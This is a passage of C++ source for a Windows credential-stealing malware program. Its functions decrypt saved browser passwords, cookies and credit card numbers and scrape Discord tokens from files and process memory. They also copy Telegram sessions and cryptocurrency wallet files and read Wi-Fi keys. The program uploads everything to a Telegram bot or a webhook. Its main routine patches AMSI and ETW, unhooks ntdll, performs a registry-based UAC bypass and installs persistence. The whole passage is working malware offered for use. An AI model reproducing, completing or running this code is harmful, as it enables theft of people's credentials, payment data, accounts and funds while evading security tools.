        std::string url = (const char*)sqlite3_column_text(stmt, 0);
        std::string username = (const char*)sqlite3_column_text(stmt, 1);
        std::vector<uint8_t> encrypted_blob((uint8_t*)sqlite3_column_blob(stmt, 2), (uint8_t*)sqlite3_column_blob(stmt, 2) + sqlite3_column_bytes(stmt, 2));
        if (encrypted_blob.empty()) continue;
        auto decrypted = decrypt_blob(master_key, encrypted_blob);
        if (!decrypted) continue;
        json entry;
        entry["type"] = "password";
        entry["browser"] = browser_name;
        entry["profile"] = profile_name;
        entry["url"] = url;
        entry["username"] = username;
        entry["password"] = *decrypted;
        write_entry(entry);
    }
}
void extract_cookies(const fs::path& profile_dir, const std::vector<uint8_t>& master_key,
                     const std::string& browser_name, const std::string& profile_name) {
    fs::path cookie_db = profile_dir / "Network" / "Cookies";
    if (!fs::exists(cookie_db)) return;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(cookie_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    std::unique_ptr<sqlite3, decltype(&sqlite3_deleter)> db_guard(db, sqlite3_deleter);
    const char* query = "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies;";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) return;
    std::unique_ptr<sqlite3_stmt, decltype(&sqlite3_stmt_deleter)> stmt_guard(stmt, sqlite3_stmt_deleter);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string host = (const char*)sqlite3_column_text(stmt, 0);
        std::string name = (const char*)sqlite3_column_text(stmt, 1);
        std::string path = (const char*)sqlite3_column_text(stmt, 2);
        std::vector<uint8_t> encrypted_blob((uint8_t*)sqlite3_column_blob(stmt, 3), (uint8_t*)sqlite3_column_blob(stmt, 3) + sqlite3_column_bytes(stmt, 3));
        if (encrypted_blob.empty()) continue;
        auto decrypted = decrypt_blob(master_key, encrypted_blob);
        if (!decrypted) continue;
        json entry;
        entry["type"] = "cookie";
        entry["browser"] = browser_name;
        entry["profile"] = profile_name;
        entry["host"] = host;
        entry["name"] = name;
        entry["path"] = path;
        entry["value"] = *decrypted;
        write_entry(entry);
    }
}
void extract_credit_cards(const fs::path& profile_dir, const std::vector<uint8_t>& master_key,
                          const std::string& browser_name, const std::string& profile_name) {
    fs::path web_db = profile_dir / "Web Data";
    if (!fs::exists(web_db)) return;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(web_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    std::unique_ptr<sqlite3, decltype(&sqlite3_deleter)> db_guard(db, sqlite3_deleter);
    const char* query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) return;
    std::unique_ptr<sqlite3_stmt, decltype(&sqlite3_stmt_deleter)> stmt_guard(stmt, sqlite3_stmt_deleter);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string name = (const char*)sqlite3_column_text(stmt, 0);
        std::string exp_month = (const char*)sqlite3_column_text(stmt, 1);
        std::string exp_year = (const char*)sqlite3_column_text(stmt, 2);
        std::vector<uint8_t> encrypted_blob((uint8_t*)sqlite3_column_blob(stmt, 3), (uint8_t*)sqlite3_column_blob(stmt, 3) + sqlite3_column_bytes(stmt, 3));
        if (encrypted_blob.empty()) continue;
        auto decrypted = decrypt_blob(master_key, encrypted_blob);
        if (!decrypted) continue;
        json entry;
        entry["type"] = "credit_card";
        entry["browser"] = browser_name;
        entry["profile"] = profile_name;
        entry["name"] = name;
        entry["exp_month"] = exp_month;
        entry["exp_year"] = exp_year;
        entry["number"] = *decrypted;
        write_entry(entry);
    }
}
void extract_history(const fs::path& profile_dir, const std::string& browser_name, const std::string& profile_name) {
    fs::path history_db = profile_dir / "History";
    if (!fs::exists(history_db)) return;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(history_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    std::unique_ptr<sqlite3, decltype(&sqlite3_deleter)> db_guard(db, sqlite3_deleter);
    const char* query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500;";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) return;
    std::unique_ptr<sqlite3_stmt, decltype(&sqlite3_stmt_deleter)> stmt_guard(stmt, sqlite3_stmt_deleter);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string url = (const char*)sqlite3_column_text(stmt, 0);
        std::string title = (const char*)sqlite3_column_text(stmt, 1);
        int count = sqlite3_column_int(stmt, 2);
        json entry;
        entry["type"] = "history";
        entry["browser"] = browser_name;
        entry["profile"] = profile_name;
        entry["url"] = url;
        entry["title"] = title;
        entry["visits"] = count;
        write_entry(entry);
    }
}
void extract_bookmarks(const fs::path& profile_dir, const std::string& browser_name, const std::string& profile_name) {
    fs::path bookmarks_file = profile_dir / "Bookmarks";
    if (!fs::exists(bookmarks_file)) return;
    std::ifstream file(bookmarks_file);
    if (!file.is_open()) return;
    json data;
    try { file >> data; }
    catch (...) { return; }
    if (!data.contains("roots")) return;
    std::function<void(const json&)> traverse = [&](const json& node) {
        if (node.contains("type") && node["type"] == "url" && node.contains("url") && node.contains("name")) {
            json entry;
            entry["type"] = "bookmark";
            entry["browser"] = browser_name;
            entry["profile"] = profile_name;
            entry["url"] = node["url"];
            entry["name"] = node["name"];
            write_entry(entry);
        }
        if (node.contains("children") && node["children"].is_array()) {
            for (const auto& child : node["children"]) traverse(child);
        }
    };
    for (auto& [key, root] : data["roots"].items()) {
        traverse(root);
    }
}
void extract_autofill(const fs::path& profile_dir, const std::string& browser_name, const std::string& profile_name) {
    fs::path web_db = profile_dir / "Web Data";
    if (!fs::exists(web_db)) return;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(web_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    std::unique_ptr<sqlite3, decltype(&sqlite3_deleter)> db_guard(db, sqlite3_deleter);
    const char* query = "SELECT name, value FROM autofill;";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) return;
    std::unique_ptr<sqlite3_stmt, decltype(&sqlite3_stmt_deleter)> stmt_guard(stmt, sqlite3_stmt_deleter);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string name = (const char*)sqlite3_column_text(stmt, 0);
        std::string value = (const char*)sqlite3_column_text(stmt, 1);
        json entry;
        entry["type"] = "autofill";
        entry["browser"] = browser_name;
        entry["profile"] = profile_name;
        entry["name"] = name;
        entry["value"] = value;
        write_entry(entry);
    }
}
void extract_discord_tokens(const fs::path& profile_dir, const std::vector<uint8_t>& master_key,
                            const std::string& browser_name, const std::string& profile_name) {
    fs::path cookie_db = profile_dir / "Network" / "Cookies";
    if (!fs::exists(cookie_db)) return;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(cookie_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    std::unique_ptr<sqlite3, decltype(&sqlite3_deleter)> db_guard(db, sqlite3_deleter);
    const char* query = "SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord.com%' AND name = 'token';";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) return;
    std::unique_ptr<sqlite3_stmt, decltype(&sqlite3_stmt_deleter)> stmt_guard(stmt, sqlite3_stmt_deleter);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::vector<uint8_t> encrypted_blob((uint8_t*)sqlite3_column_blob(stmt, 0), (uint8_t*)sqlite3_column_blob(stmt, 0) + sqlite3_column_bytes(stmt, 0));
        if (encrypted_blob.empty()) continue;
        auto decrypted = decrypt_blob(master_key, encrypted_blob);
        if (!decrypted) continue;
        json entry;
        entry["type"] = "discord_token";
        entry["browser"] = browser_name;
        entry["profile"] = profile_name;
        entry["token"] = *decrypted;
        write_entry(entry);
    }
}
void extract_discord_tokens_leveldb() {
    fs::path local_appdata = getenv("LOCALAPPDATA");
    fs::path discord_path = local_appdata / "Discord";
    if (!fs::exists(discord_path)) return;
    for (auto& version : fs::directory_iterator(discord_path)) {
        if (version.is_directory() && version.path().filename().string().find("app-") != std::string::npos) {
            fs::path leveldb = version.path() / "Local Storage" / "leveldb";
            if (!fs::exists(leveldb)) continue;
            for (auto& file : fs::directory_iterator(leveldb)) {
                if (file.path().extension() == ".log" || file.path().filename().string().find(".ldb") != std::string::npos) {
                    std::ifstream f(file.path(), std::ios::binary);
                    if (!f.is_open()) continue;
                    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                    std::regex token_regex(R"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27})");
                    std::smatch match;
                    auto start = content.cbegin();
                    while (std::regex_search(start, content.cend(), match, token_regex)) {
                        json entry;
                        entry["type"] = "discord_token_leveldb";
                        entry["token"] = match.str();
                        write_entry(entry);
                        start = match.suffix().first;
                    }
                }
            }
        }
    }
}
void extract_telegram_session() {
    fs::path appdata = getenv("APPDATA");
    fs::path tdata = appdata / "Telegram Desktop" / "tdata";
    if (!fs::exists(tdata)) return;
    for (auto& entry : fs::directory_iterator(tdata)) {
        if (entry.path().filename().string().find("D877F783D5D3EF8C") != std::string::npos) {
            fs::copy(entry.path(), fs::path(g_config.output_dir) / entry.path().filename());
        }
    }
}
void extract_crypto_wallets() {
    fs::path appdata = getenv("APPDATA");
    fs::path localappdata = getenv("LOCALAPPDATA");
    std::vector<std::pair<fs::path, std::string>> wallets = {
        {appdata / "Exodus" / "exodus.wallet", "Exodus"},
        {appdata / "Electrum" / "wallets" / "default_wallet", "Electrum"},
        {appdata / "Atomic" / "AtomicWallet" / "wallet.dat", "Atomic"},
        {appdata / "Guarda" / "Guarda" / "wallet.dat", "Guarda"},
        {appdata / "Coinomi" / "Coinomi" / "wallet.dat", "Coinomi"},
        {localappdata / "Binance" / "Binance" / "wallet.dat", "Binance"},
        {appdata / "MetaMask" / "Local Storage" / "leveldb", "MetaMask"},
        {appdata / "Trust Wallet" / "Trust Wallet" / "wallet.dat", "Trust"},
        {appdata / "Phantom" / "Phantom" / "wallet.dat", "Phantom"},
    };
    for (auto& [path, name] : wallets) {
        if (fs::exists(path)) {
            json entry;
            entry["type"] = "crypto_wallet";
            entry["name"] = name;
            entry["path"] = path.string();
            write_entry(entry);
            fs::copy(path, fs::path(g_config.output_dir) / (name + ".dat"));
        }
    }
}
void extract_filezilla() {
    fs::path appdata = getenv("APPDATA");
    fs::path filezilla = appdata / "FileZilla" / "sitemanager.xml";
    if (fs::exists(filezilla)) {
        json entry;
        entry["type"] = "filezilla";
        entry["path"] = filezilla.string();
        write_entry(entry);
        fs::copy(filezilla, fs::path(g_config.output_dir) / "sitemanager.xml");
    }
}
void extract_outlook() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        json entry;
        entry["type"] = "outlook_profiles";
        write_entry(entry);
        RegCloseKey(hKey);
    }
}
void extract_wifi() {
    HANDLE wlanHandle = nullptr;
    DWORD negotiatedVersion;
    if (WlanOpenHandle(2, NULL, &negotiatedVersion, &wlanHandle) != ERROR_SUCCESS) return;
    PWLAN_INTERFACE_INFO_LIST ifaceList = nullptr;
    if (WlanEnumInterfaces(wlanHandle, NULL, &ifaceList) != ERROR_SUCCESS) { WlanCloseHandle(wlanHandle, NULL); return; }
    for (DWORD i = 0; i < ifaceList->dwNumberOfItems; i++) {
        PWLAN_PROFILE_INFO_LIST profileList = nullptr;
        if (WlanGetProfileList(wlanHandle, &ifaceList->InterfaceInfo[i].InterfaceGuid, NULL, &profileList) == ERROR_SUCCESS) {
            for (DWORD j = 0; j < profileList->dwNumberOfItems; j++) {
                wchar_t* xmlData = nullptr;
                DWORD flags = 0;
                if (WlanGetProfile(wlanHandle, &ifaceList->InterfaceInfo[i].InterfaceGuid, profileList->ProfileInfo[j].strProfileName, NULL, &xmlData, &flags, NULL) == ERROR_SUCCESS) {
                    if (xmlData) {
                        std::wstring xml(xmlData);
                        std::wstring key = L"<keyMaterial>";
                        size_t pos = xml.find(key);
                        if (pos != std::wstring::npos) {
                            size_t end = xml.find(L"</keyMaterial>", pos);
                            if (end != std::wstring::npos) {
                                std::wstring pass = xml.substr(pos + key.length(), end - pos - key.length());
                                json entry;
                                entry["type"] = "wifi";
                                entry["ssid"] = wstr_to_utf8(profileList->ProfileInfo[j].strProfileName);
                                entry["password"] = wstr_to_utf8(pass);
                                write_entry(entry);
                            }
                        }
                        WlanFreeMemory(xmlData);
                    }
                }
                WlanFreeMemory(profileList);
            }
        }
    }
    WlanFreeMemory(ifaceList);
    WlanCloseHandle(wlanHandle, NULL);
}
void extract_vpn() {
    fs::path appdata = getenv("APPDATA");
    fs::path localappdata = getenv("LOCALAPPDATA");
    std::vector<fs::path> vpn_paths = {
        appdata / "NordVPN" / "NordVPN" / "config",
        appdata / "ExpressVPN" / "config",
        localappdata / "ProtonVPN" / "config",
    };
    for (auto& path : vpn_paths) {
        if (fs::exists(path)) {
            json entry;
            entry["type"] = "vpn";
            entry["path"] = path.string();
            write_entry(entry);
        }
    }
}
void extract_passwords_from_memory(const std::wstring& process_name) {
    DWORD processes[1024], cbNeeded;
    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) return;
    DWORD numProcesses = cbNeeded / sizeof(DWORD);
    for (DWORD i = 0; i < numProcesses; i++) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processes[i]);
        if (hProcess) {
            wchar_t szProcessName[MAX_PATH] = L"<unknown>";
            HMODULE hMod;
            DWORD cbNeededMod;
            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeededMod)) {
                GetModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(wchar_t));
            }
            if (_wcsicmp(szProcessName, process_name.c_str()) == 0) {
                SYSTEM_INFO sysInfo;
                GetSystemInfo(&sysInfo);
                MEMORY_BASIC_INFORMATION memInfo;
                BYTE* pAddress = (BYTE*)sysInfo.lpMinimumApplicationAddress;
                while (pAddress < sysInfo.lpMaximumApplicationAddress) {
                    if (VirtualQueryEx(hProcess, pAddress, &memInfo, sizeof(memInfo)) == 0) break;
                    if (memInfo.State == MEM_COMMIT && (memInfo.Protect & PAGE_READWRITE)) {
                        std::vector<BYTE> buffer(memInfo.RegionSize);
                        SIZE_T bytesRead;
                        if (ReadProcessMemory(hProcess, pAddress, buffer.data(), memInfo.RegionSize, &bytesRead)) {
                            std::string region((char*)buffer.data(), bytesRead);
                            std::regex pass_regex(R"("password"\s*:\s*"([^"]+)")", std::regex::icase);
                            std::smatch match;
                            auto start = region.cbegin();
                            while (std::regex_search(start, region.cend(), match, pass_regex)) {
                                json entry;
                                entry["type"] = "memory_password";
                                entry["process"] = wstr_to_utf8(process_name);
                                entry["value"] = match[1].str();
                                write_entry(entry);
                                start = match.suffix().first;
                            }
                            std::regex token_regex(R"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27})");
                            start = region.cbegin();
                            while (std::regex_search(start, region.cend(), match, token_regex)) {
                                json entry;
                                entry["type"] = "memory_token";
                                entry["process"] = wstr_to_utf8(process_name);
                                entry["token"] = match.str();
                                write_entry(entry);
                                start = match.suffix().first;
                            }
                        }
                    }
                    pAddress += memInfo.RegionSize;
                }
                CloseHandle(hProcess);
                break;
            }
            CloseHandle(hProcess);
        }
    }
}
void steal_browser_memory() {
    std::vector<std::wstring> browsers = {L"msedge.exe", L"chrome.exe", L"brave.exe", L"opera.exe"};
    for (const auto& browser : browsers) {
        extract_passwords_from_memory(browser);
    }
}
void extract_steam() {
    fs::path steam = fs::path(getenv("PROGRAMFILES(X86)")) / "Steam" / "config" / "loginusers.vdf";
    if (fs::exists(steam)) {
        json entry;
        entry["type"] = "steam";
        entry["path"] = steam.string();
        write_entry(entry);
    }
}
bool winhttp_upload_file(const std::wstring& server, const std::wstring& path, const std::wstring& file_path) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    HINTERNET hConnect = WinHttpConnect(hSession, server.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    std::wstring boundary = L"---------------------------" + std::to_wstring(GetTickCount64());
    std::wstring header = L"Content-Type: multipart/form-data; boundary=" + boundary;
    WinHttpAddRequestHeaders(hRequest, header.c_str(), (DWORD)header.length(), WINHTTP_ADDREQ_FLAG_ADD);
    std::vector<uint8_t> fileData;
    std::ifstream file(file_path, std::ios::binary);
    if (!file.is_open()) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    fileData.resize(size);
    file.read((char*)fileData.data(), size);
    file.close();
    std::wstring bodyStart = L"--" + boundary + L"\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + file_path.substr(file_path.find_last_of(L'\\') + 1) + L"\"\r\nContent-Type: application/octet-stream\r\n\r\n";
    std::string bodyStartA = wstr_to_utf8(bodyStart);
    std::wstring bodyEnd = L"\r\n--" + boundary + L"--\r\n";
    std::string bodyEndA = wstr_to_utf8(bodyEnd);
    std::vector<uint8_t> postData;
    postData.insert(postData.end(), bodyStartA.begin(), bodyStartA.end());
    postData.insert(postData.end(), fileData.begin(), fileData.end());
    postData.insert(postData.end(), bodyEndA.begin(), bodyEndA.end());
    if (!WinHttpSendRequest(hRequest, NULL, 0, (LPVOID)postData.data(), (DWORD)postData.size(), (DWORD)postData.size(), 0)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false;
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return true;
}
bool send_to_telegram(const std::wstring& file_path) {
    std::wstring bot_token = utf8_to_wstr(g_config.telegram_bot_token);
    std::wstring chat_id = utf8_to_wstr(g_config.telegram_chat_id);
    std::wstring url = L"/bot" + bot_token + L"/sendDocument";
    std::wstring server = L"api.telegram.org";
    return winhttp_upload_file(server, url, file_path);
}
bool send_to_webhook(const std::wstring& file_path) {
    std::wstring url = utf8_to_wstr(g_config.webhook_url);
    size_t pos = url.find(L"://");
    if (pos == std::wstring::npos) return false;
    std::wstring protocol = url.substr(0, pos);
    url = url.substr(pos + 3);
    std::wstring server, path;
    pos = url.find(L'/');
    if (pos != std::wstring::npos) {
        server = url.substr(0, pos);
        path = url.substr(pos);
    } else {
        server = url;
        path = L"/";
    }
    return winhttp_upload_file(server, path, file_path);
}
void exfiltrate_data() {
    if (!g_config.exfiltrate) return;
    fs::path output_file = fs::path(g_config.output_dir) / "stealer_output.json";
    if (!fs::exists(output_file)) return;
    if (!g_config.telegram_bot_token.empty() && !g_config.telegram_chat_id.empty()) {
        send_to_telegram(output_file.wstring());
    }
    if (!g_config.webhook_url.empty()) {
        send_to_webhook(output_file.wstring());
    }
}
std::map<std::string, std::vector<fs::path>> get_browser_paths() {
    std::map<std::string, std::vector<fs::path>> browsers;
    fs::path local = getenv("LOCALAPPDATA");
    fs::path roaming = getenv("APPDATA");
    auto add = [&](const std::string& name, const fs::path& path) {
        if (fs::exists(path) && fs::is_directory(path)) {
            browsers[name].push_back(path);
        }
    };
    add("Chrome", local / "Google" / "Chrome" / "User Data");
    add("Edge", local / "Microsoft" / "Edge" / "User Data");
    add("Brave", local / "BraveSoftware" / "Brave-Browser" / "User Data");
    add("Opera", roaming / "Opera Software" / "Opera Stable");
    add("Vivaldi", local / "Vivaldi" / "User Data");
    add("Chromium", local / "Chromium" / "User Data");
    add("Firefox", roaming / "Mozilla" / "Firefox" / "Profiles");
    return browsers;
}
class ThreadPool {
public:
    ThreadPool(size_t threads) : stop(false) {
        if (threads == 0) threads = std::thread::hardware_concurrency();
        for (size_t i = 0; i < threads; ++i) {
            workers.emplace_back([this] {
                while (true) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(this->queue_mutex);
                        this->condition.wait(lock, [this] { return this->stop || !this->tasks.empty(); });
                        if (this->stop && this->tasks.empty()) return;
                        task = std::move(this->tasks.front());
                        this->tasks.pop();
                    }
                    task();
                }
            });
        }
    }
    template<class F>
    void enqueue(F&& f) {
        {
            std::unique_lock<std::mutex> lock(queue_mutex);
            tasks.emplace(std::forward<F>(f));
        }
        condition.notify_one();
    }
    ~ThreadPool() {
        {
            std::unique_lock<std::mutex> lock(queue_mutex);
            stop = true;
        }
        condition.notify_all();
        for (std::thread& worker : workers) worker.join();
    }
private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex queue_mutex;
    std::condition_variable condition;
    bool stop;
};
json get_system_fingerprint() {
    json fp;
    char hostname[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    fp["hostname"] = hostname;
    fp["username"] = getenv("USERNAME");
    fp["os"] = "Windows";
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t build[64];
        DWORD buildSize = sizeof(build);
        if (RegQueryValueExW(hKey, L"CurrentBuild", NULL, NULL, (LPBYTE)build, &buildSize) == ERROR_SUCCESS) {
            fp["build"] = wstr_to_utf8(build);
        }
        RegCloseKey(hKey);
    }
    return fp;
}
void process_browser(ThreadPool& pool, const std::string& browser_name, const std::vector<fs::path>& dirs, const std::string& filter_profile) {
    for (const auto& dir : dirs) {
        if (browser_name == "Firefox") {
            for (auto& profile : fs::directory_iterator(dir)) {
                if (profile.is_directory()) {
                    fs::path logins = profile.path() / "logins.json";
                    fs::path cookies = profile.path() / "cookies.sqlite";
                    if (fs::exists(logins)) {
                        json entry;
                        entry["type"] = "firefox_logins";
                        entry["browser"] = "Firefox";
                        entry["profile"] = profile.path().filename().string();
                        write_entry(entry);
                    }
                    if (fs::exists(cookies)) {
                        json entry;
                        entry["type"] = "firefox_cookies";
                        entry["browser"] = "Firefox";
                        entry["profile"] = profile.path().filename().string();
                        write_entry(entry);
                    }
                }
            }
            continue;
        }
        fs::path local_state = dir / "Local State";
        if (!fs::exists(local_state)) continue;
        auto master_key = get_master_key(local_state, browser_name);
        if (!master_key) continue;
        auto profiles = find_profiles(dir);
        for (const auto& profile : profiles) {
            std::string profile_name = profile.filename().string();
            if (!filter_profile.empty() && profile_name != filter_profile) continue;
            pool.enqueue([=]() {
                extract_passwords(profile, *master_key, browser_name, profile_name);
                extract_cookies(profile, *master_key, browser_name, profile_name);
                extract_credit_cards(profile, *master_key, browser_name, profile_name);
                extract_history(profile, browser_name, profile_name);
                extract_bookmarks(profile, browser_name, profile_name);
                extract_autofill(profile, browser_name, profile_name);
                extract_discord_tokens(profile, *master_key, browser_name, profile_name);
            });
        }
    }
}
void uac_bypass() {
    std::wstring path = utf8_to_wstr(fs::current_path().string() + "\\" + fs::path(GetModuleFileNameA(NULL)).filename().string());
    std::wstring cmd = L"cmd /c start /min \"\" \"" + path + L"\"";
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)cmd.c_str(), (DWORD)((cmd.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD dword = 0;
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_DWORD, (const BYTE*)&dword, sizeof(dword));
        RegCloseKey(hKey);
    }
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"open";
    sei.lpFile = L"ms-settings:";
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);
}
void elevate_system() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, SE_IMPERSONATE_NAME, &luid)) { CloseHandle(hToken); return; }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    HANDLE hProcess = GetCurrentProcess();
    HANDLE hTokenDup;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hTokenDup)) return;
    HANDLE hSystemToken = NULL;
    DuplicateTokenEx(hTokenDup, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hSystemToken);
    CloseHandle(hTokenDup);
    if (hSystemToken) {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        wchar_t cmd[MAX_PATH];
        GetSystemDirectoryW(cmd, MAX_PATH);
        wcscat_s(cmd, L"\\cmd.exe");
        CreateProcessWithTokenW(hSystemToken, LOGON_WITH_PROFILE, cmd, NULL, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hSystemToken);
    }
}
int main(int argc, char* argv[]) {
    OPENSSL_init_crypto(OPENSSL_INIT_ADD_ALL_CIPHERS | OPENSSL_INIT_ADD_ALL_DIGESTS, nullptr);
    g_ntdll = GetModuleHandleA("ntdll.dll");
    hellsgate_resolve();
    unhook_ntdll();
    find_syscall_gadget();
    patch_etw();
    patch_amsi();
    std::string app_key_decrypt_arg;
    std::wstring browser_app_path_arg;
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--app-key-decrypt" && i + 1 < argc) {
            app_key_decrypt_arg = argv[++i];
        } else if (arg == "--browser-app-path" && i + 1 < argc) {
            browser_app_path_arg = utf8_to_wstr(argv[++i]);
        } else if (arg == "--telegram-token" && i + 1 < argc) g_config.telegram_bot_token = argv[++i];
        else if (arg == "--telegram-chat" && i + 1 < argc) g_config.telegram_chat_id = argv[++i];
        else if (arg == "--webhook" && i + 1 < argc) g_config.webhook_url = argv[++i];
        else if (arg == "--no-exfil") g_config.exfiltrate = false;
        else if (arg == "--no-compress") g_config.compress = false;
        else if (arg == "--no-silent") g_config.silent = false;
        else if (arg == "--no-antidebug") g_config.anti_debug = false;
        else if (arg == "--no-persistence") g_config.persistence = false;
        else if (arg == "--threads" && i + 1 < argc) g_config.max_threads = std::stoi(argv[++i]);
        else if (arg == "--output-dir" && i + 1 < argc) g_config.output_dir = argv[++i];
    }
    if (!app_key_decrypt_arg.empty()) {
        auto result = decrypt_app_bound_key(app_key_decrypt_arg, browser_app_path_arg);
        if (result) {
            std::wstring outPath = browser_app_path_arg + L"\\appkey.txt";
            std::ofstream outFile(outPath);
            if (outFile.is_open()) {
                outFile << *result;
                outFile.close();
            }
        }
        return 0;
    }
    if (g_config.anti_debug) {
        std::thread(anti_debug_loop).detach();
    }
    if (g_config.persistence) {
        install_persistence();
    }
    uac_bypass();
    elevate_system();
    json fp = get_system_fingerprint();
    g_global_json["fingerprint"] = fp;
    fs::create_directories(g_config.output_dir);
    fs::path output_file_path = fs::path(g_config.output_dir) / "stealer_output.json";
    g_output_file.open(output_file_path, std::ios::out | std::ios::trunc);
    if (g_output_file.is_open()) {
        g_output_file << "[\n";
    }
    auto all_browsers = get_browser_paths();
    std::map<std::string, std::vector<fs::path>> filtered_browsers;
    if (!g_config.browsers_filter.empty()) {
        for (const auto& name : g_config.browsers_filter) {
            if (all_browsers.find(name) != all_browsers.end()) {
                filtered_browsers[name] = all_browsers[name];
            }
        }
    } else {
        filtered_browsers = all_browsers;
    }
    {
        ThreadPool pool(g_config.max_threads);
        for (const auto& [name, dirs] : filtered_browsers) {
            process_browser(pool, name, dirs, "");
        }
    }
    extract_discord_tokens_leveldb();
    extract_telegram_session();
    extract_crypto_wallets();
    extract_filezilla();
    extract_outlook();
    extract_wifi();
    extract_vpn();
    steal_browser_memory();
    extract_steam();
    if (g_output_file.is_open()) {
        if (g_output_count > 0) {
            g_output_file.seekp(-1, std::ios::end);
            g_output_file << "\n";
        } else {
            g_output_file.seekp(0, std::ios::end);
        }
        g_output_file << "]\n";
        g_output_file.close();
    }
